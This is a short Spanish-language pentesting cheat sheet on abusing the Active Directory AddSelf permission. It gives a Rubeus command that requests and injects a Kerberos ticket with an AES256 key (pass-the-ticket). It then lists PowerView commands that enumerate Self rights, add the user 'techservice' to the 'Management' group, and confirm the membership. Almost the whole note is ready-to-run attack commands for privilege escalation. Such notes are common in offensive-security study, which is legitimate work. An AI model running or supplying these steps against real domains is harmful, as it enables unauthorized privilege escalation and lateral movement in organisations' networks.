# Abuso ACL 

Tags: #AD #ACL #Windows 

El permiso **`AddSelf`** en un grupo de AD permite que un usuario se agregue a **sí mismo** al grupo sin necesidad de permisos de administrador.
## AddSelf sobre Grupo 

```powershell 
# Importar el ticket (TGT)
❯ .\Rubeus.exe asktgt /user:techservice /aes256:5bdc2beb1ae5787a676c9d42c48852a79ece3effa875a288ea8a8b29691035dd /domain:domain.corp /show /ptt
```

## PowerView
```powershell 
# 1. Enumerar AddSelf en grupos
❯ Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "Self"} | Select-Object ObjectDN, IdentityReference, ActiveDirectoryRights

# 2. Si tienes AddSelf en Management, agregarte
❯ Add-DomainGroupMember -Identity Management -Members techservice -Verbose

# 3. Verificar
❯ Get-DomainGroupMember -Identity Management | Select-Object MemberName
```